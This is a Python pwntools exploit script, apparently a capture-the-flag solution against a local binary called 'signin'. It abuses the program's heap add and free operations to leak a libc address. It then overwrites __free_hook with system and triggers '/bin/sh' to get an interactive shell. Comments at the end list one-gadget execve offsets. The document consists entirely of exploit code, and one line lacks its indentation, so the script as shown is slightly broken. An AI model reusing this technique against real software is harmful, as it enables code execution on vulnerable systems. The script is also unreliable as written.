from pwn import *
from time import time
s = process("./signin")
libc = ELF("./libc.so")
def add(idx,num):
    s.sendlineafter(">>","1")
    s.sendlineafter("Index:",str(idx))
    s.sendlineafter("Number:",str(num))
def free(idx):
    s.sendlineafter(">>","2")
    s.sendlineafter("Index:",str(idx))
def show(idx):
    s.sendlineafter(">>","3")
    s.sendlineafter("Index:",str(idx))
for i in range(257):
print i,
    add(1,1)
for i in range(514):
    print i,
    free(1)
show(1)
tmp = int(s.recvline(keepends=False))-0x3ebca0
success(hex(tmp))
free_hook = libc.sym['__free_hook']+tmp
system = tmp+libc.sym['system']
for i in range(269):
    print i,
    free(1)
show(1)
# gdb.attach(s,'b *$rebase(0x11e0)\nc')
add(1,free_hook-0x8)
add(2,u64("/bin/sh\x00"))
add(2,system)
s.interactive()
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL